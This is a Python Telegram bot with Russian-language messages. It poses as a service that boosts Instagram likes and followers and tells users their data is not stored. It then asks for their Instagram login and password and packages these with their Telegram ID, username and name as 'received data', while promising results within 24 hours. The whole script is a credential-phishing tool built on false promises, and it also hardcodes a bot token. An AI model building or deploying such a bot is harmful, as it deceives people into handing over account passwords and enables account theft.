
import telebot
from telebot import *
import time
import random

from telebot.types import Message
print("Бот запущен!")
log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = 'Your_ID_Telegram'
bot = telebot.TeleBot("2072726849:AAHhooDusehBGfX_4-8FATYUXN5wqZNt5oc")
try:
	bot.send_message(Message.chat.id, ' Бот запущен!') 
except:
	print("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!")


@bot.message_handler(commands=['start'])
def start(message):
	print(f'''Обнаружен пользователь!
ID: {message.from_user.id}''')
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Это бот накрутки лайков и подписчиков на ваш инстаграм аккаунт!
		Для вашей же безопасности мы не сохраняем нигде ваши данные.🔐 Не волнуйтесь
		Чтобы начать, нажмите /nacrutka''')
	
	bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAEDFglhaWEoQvJS_tTWIijavcbSZqHSJgACvgwAAl_4OEoV6nXv_pjK5yEE") 

@bot.message_handler(commands=['nacrutka', 'n'])
def start1(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
	second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="sub")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline1(call):
	if call.data == "like":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество лайков (не более 500)') 
		bot.send_sticker(call.message.chat.id, "CAACAgIAAxkBAAEDFiFhaWlZtJyuhuZemcy8H5pEeSoo8gACaAEAAhAabSL1Nxwp9hekbyEE") 
		bot.register_next_step_handler(msg, qproc1)
	
	elif call.data == "sub":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество подписчиков (не более 100)')
		bot.send_sticker(call.message.chat.id, "CAACAgIAAxkBAAEDFiBhaWlZ2ar8_imUizzh-vvbO4VHnAACZQEAAhAabSJhjGLAZuk2oSEE") 
		bot.register_next_step_handler(msg, qproc2) 

def qproc1(message):
	try:
		num = message.text	
		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
			return
		elif int(num) > 500:
			bot.reply_to(message, 'Колличество лайков не может быть более 500!')
			msg = bot.reply_to(message, 'Повторите попытку, написав /nacrutka!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество лайков: {num}')
			msg = bot.send_message(message.chat.id, '''Введите почту(номер) и пароль от вашего аккаунта. 
			Пример вот так: +7(926)8888888/и ваш пароль 1234qwerty''') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def qproc2(message):
	try:
		num = message.text
		if not num.isdigit():
			bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
			return
		elif int(num) > 100:
			bot.reply_to(message, 'Колличество подписчиков не может быть более 100!')
			msg = bot.reply_to(message, 'Повторите попытку, написав /nacrutka!')
			return
		else:
			bot.send_message(message.chat.id, f'Колличество подписчиков: {num}')
			msg = bot.send_message(message.chat.id, '''Введите почту(номер) и пароль от вашего аккаунта. 
			Пример вот так: +7(926)8888888/и ваш пароль 1234qwerty''') 
			bot.register_next_step_handler(msg, step1)
	except Exception as e:
		print(e)


def step1(message):
	print(message)
	get = f'''Полученные данные: 
Получено в боте: instagram
ID: {message.from_user.id}
Ник: @{message.from_user.username}
Логин: {message.text}
Имя: {message.from_user.first_name}

'''
	
	bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')

	bot.reply_to(message, f'Если хотите воспользоватся нашим сервисом ещё раз, то просто напишите /nacrutka')
	
	bot.send_sticker(message.chat.id, "CAACAgIAAxkBAAEDFiZhaWx434bis0crxa4P75Ea62VTOwACaQEAAhAabSLT-dGKr5wzrSEE") 


bot.polling()
		